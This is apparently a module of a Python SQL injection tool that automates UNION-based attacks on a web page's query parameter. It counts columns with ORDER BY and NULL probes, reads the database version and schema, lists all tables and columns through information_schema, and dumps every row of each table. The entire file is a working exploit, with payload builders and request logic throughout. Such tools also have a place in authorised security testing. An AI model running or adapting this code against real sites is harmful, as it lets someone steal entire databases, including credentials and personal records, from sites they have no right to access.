from utils.ainsi import *
from utils.objects.vuln_link import *
from utils.objects.success_obj import *

import requests
import re
from urllib.parse import urlparse
from bs4 import BeautifulSoup


#! ------------------------------------------------------------

def generate_union_select_marker_payload(number):
    buffer = ""
    base_payload = "' UNION SELECT "
    chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
    end_payload = "-- -"
    if number > len(chars):
        return None
    
    buffer += base_payload
    # print(len(chars))
    for i in range(0, number):
        buffer += "'MARKER_" + chars[i] + "'"
        if i < number - 1:
            buffer+= ","
    buffer += end_payload
    return buffer

def generate_union_select_null_payload(number):
    buffer = None
    base_payload = "' UNION SELECT "
    marker = "NULL"
    end_payload = "-- -"
    
    if (number < 1):
        return None
    buffer = base_payload
    for i in range (0, number):
        buffer += marker
        if i < number - 1:
            buffer += ","
    buffer += end_payload
    return (buffer)
    
def generate_union_payload(base_payload, end_payload, number, start_num):
    buffer = None

    if number < 1:
        return None
    buffer = base_payload
    for i in range(start_num, number):
        buffer += ", " + str(i)
    buffer += end_payload
    return buffer


def generate_union_columns_payload(base_payload, columns_tag ,number, end_payload):
    buffer = None
    if number < 1 or len(columns_tag) < 1:
        return None
    buffer = base_payload
    for tag in columns_tag:
        buffer += f", '{tag}', {tag}"
    buffer += ", '\n'))"
    return generate_union_payload(buffer, end_payload, number + 1, 2)


def generate_marker_to_find(number):
        base = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
        chars = set()
        if (number > len(base)):
            return chars
        for i in range(0, number):
            chars.add("MARKER_" + base[i])
        chars = sorted(chars)
        return chars   



def get_union_lines_response(response):
    texts = []
    
    soup = BeautifulSoup(response.text, "html.parser")
    extracted = soup.find_all(string=True)
    
    for text in extracted:
        texts.append(text)
    return texts
    
def perform_request(link):
    try:
        response = requests.get(link)
        response.raise_for_status()
        return response
    except requests.exceptions.RequestException as e:
        print(f"{colored('Failed to request ', RED)} {colored(link, BRIGHT_RED, styles=BOLD)}: {e}")
        return None


#? GETTING NUMBERS OF COLUMNS
def get_union_columns_size(query_params, base_url):
    columns = 0
    
    #! ' ORDER BY 2-- -
    for i in range(0, 52):
        payload = f"' ORDER BY {i}-- -"
        
        params = query_params.copy() if isinstance(query_params, dict) else {}
        
        param_name = list(params.keys())[0] if params else query_params
        params[param_name] = payload
        
        response = requests.get(base_url, params=params)
        if "Unknown column" in response.text and i != 0:
            columns = i - 1
            break
    
    #! ' UNION SELECT NULL,NULL -- -
    if columns == 0:
        for i in range(1,52):
            payload = generate_union_select_null_payload(i)

            params = query_params.copy() if isinstance(query_params, dict) else {}
            
            param_name = list(params.keys())[0] if params else query_params
            params[param_name] = payload
            
            response = requests.get(base_url, params=params)
            
            if "expects" not in response.text:
                columns = i
                break
        
    return columns

def get_union_based_injection(query_params, base_url, identified_db):
        payloads = []
        
        #! SEARCH FOR NUM OF COLUMNS
        columns = get_union_columns_size(query_params, base_url)
        if columns < 1:
            return None
       
        
        #! INJECTING PARAMETERS TO FIND CATEGORY
        payload = generate_union_select_marker_payload(columns)
        payloads.append(payload)
        params = query_params.copy() if isinstance(query_params, dict) else {}
        param_name = list(params.keys())[0] if params else query_params
        params[param_name] = payload
        
        response = requests.get(base_url, params=params)
        
        marker_to_find = generate_marker_to_find(columns)

        #! 1 : FINDING MARKER POS IN PAGE
        base_lines = get_union_lines_response(response)
                    
        #! 2 : FINDING VERSION AND SCHEMA
        payload = generate_union_payload("' UNION SELECT CONCAT(@@version,0x3a,schema())", "-- -", columns, 1)
        payloads.append(payload)
        params = query_params.copy() if isinstance(query_params, dict) else {}
        
        param_name = list(params.keys())[0] if params else query_params
        params[param_name] = payload
        response = requests.get(base_url, params=params)
        
        soup = BeautifulSoup(response.text, "html.parser")
        lines_table = soup.find_all(string=True)
                        
        for base_line, lines_table in zip(base_lines, lines_table):
            if base_line in marker_to_find and not lines_table.isdigit():
                version = lines_table 
        
        #! 3 : FINDING TABLE NAME 
        payload = generate_union_payload("' UNION SELECT GROUP_CONCAT(table_name)", " FROM information_schema.tables WHERE table_schema=DATABASE()-- -", columns, 1)
        payloads.append(payload)
        params = query_params.copy() if isinstance(query_params, dict) else {}
        
        param_name = list(params.keys())[0] if params else query_params
        params[param_name] = payload
        response = requests.get(base_url, params=params)
        
        soup = BeautifulSoup(response.text, "html.parser")
        lines_table = soup.find_all(string=True)
                        
        table_tags = []       
        #? COMPARING BASE_LINE
        for base_line, tables_line in zip(base_lines, lines_table):
            if base_line in marker_to_find and not tables_line.isdigit():
                if isinstance(tables_line, str):
                    table_tags.extend(tables_line.split(','))
        
        #! 4 : FINDING COLUMN_NAME
        tables_obj = []
        for tag in table_tags:
            # print(f"TABLE : {colored(tag, background=BG_MAGENTA)} ")            
            payload = generate_union_payload("' UNION SELECT GROUP_CONCAT(column_name)", f" FROM information_schema.columns WHERE table_name='{tag}'-- -", columns, 1)
            payloads.append(payload)
            params = query_params.copy() if isinstance(query_params, dict) else {}
        
            param_name = list(params.keys())[0] if params else query_params
            params[param_name] = payload
            response = requests.get(base_url, params=params)
            
            soup = BeautifulSoup(response.text, "html.parser")
            lines_columns = soup.find_all(string=True)
            
            # print(f"FINDING COLUMNS : {colored(payload, background=BG_RED)}")
            
            columns_tag = []
            for base_line, line_columns in zip(base_lines, lines_columns):
                if base_line in marker_to_find and not line_columns.isdigit():
                    if isinstance(line_columns, str):
                        columns_tag.extend(line_columns.split(','))
            
            # print("TAG : ", end="")
            # for tag_print in columns_tag:
            #     print(f"{colored(tag_print, background=BG_BLUE)} ", end="")
            # print()
            
            #! 5 : DISPLAY ALL COLUMNS
            payload = generate_union_columns_payload("' UNION SELECT GROUP_CONCAT(CONCAT_WS(':'", columns_tag, columns,f" FROM {tag} -- -")
            payloads.append(payload)
            
            params = query_params.copy() if isinstance(query_params, dict) else {}
        
            param_name = list(params.keys())[0] if params else query_params
            params[param_name] = payload
            response = requests.get(base_url, params=params)
            
            soup = BeautifulSoup(response.text, "html.parser")
            lines_columns = soup.find_all(string=True)
            
            # print(f"COLUMNS  INFO : {colored(payload, background=BG_RED)}")
                
            for base_line, line_columns in zip(base_lines, lines_columns):
                if base_line in marker_to_find and not line_columns.isdigit():
                    # print(f"{colored(line_columns, background=BG_GREEN)}")
                    tables_obj.append(Table_obj(tag, columns_tag, line_columns))
            
            success = Success_obj(True, identified_db, version, tables_obj, payloads)
            
        return success